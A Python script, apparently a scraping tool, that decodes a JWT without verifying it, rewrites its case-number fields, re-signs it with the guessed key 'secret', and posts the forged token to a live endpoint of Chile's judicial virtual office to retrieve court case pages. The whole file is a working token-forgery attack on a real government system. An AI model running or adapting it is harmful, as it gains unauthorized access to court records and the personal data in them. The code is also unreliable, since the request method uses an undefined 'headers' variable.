import jwt
import requests


class JWTManager:
    def __init__(self, raw_jwt):
        self.original_jwt = raw_jwt.split("'")[1]
        print(f"[*] JWT Manager initialized...")
        # print(f"Original JWT: {case_jwt_encoded}")

    def decoder(self):
        print(f"[*] JWT Manager decoding...")
        # Decode JWT
        jwt_options = {
            "verify_signature": False
        }
        self.decoded_jwt = jwt.decode(
            self.original_jwt,
            algorithms=["HS256"],
            options=jwt_options
        )
        # print(f"Decoded JWT: {case_jwt_decoded}")  # dict

    def modify(self, rol: str, era: str):
        print(f"[*] JWT Manager modifying JWT payload...")
        # Modify JWT data
        self.decoded_jwt["data"]["rolCausa"] = rol
        self.decoded_jwt["data"]["eraCausa"] = era

        # print(f"Modified JWT: {case_jwt_decoded}")  # dict

    def encode(self):
        print(f"[*] JWT Manager encoding new JWT request...")
        self.encoded_jwt = jwt.encode(
            self.decoded_jwt,
            "secret",
            algorithm="HS256",
        )
        self.encoded_jwt
        # print(f"Modifiend Encoded JWT: {encoded_jwt}")

    def request(self):
        SEARCH_URL = "https://oficinajudicialvirtual.pjud.cl/ADIR_871/apelaciones/modal/causaApelaciones.php"
        payload = f"dtaCausa=('{self.encoded_jwt}')"
        print(f"[*] Sending new JWT request!")
        response = requests.post(SEARCH_URL, headers=headers, data=payload)
        html = response.text

        with open("example.html", "w") as file:
            file.write(html)

        return html
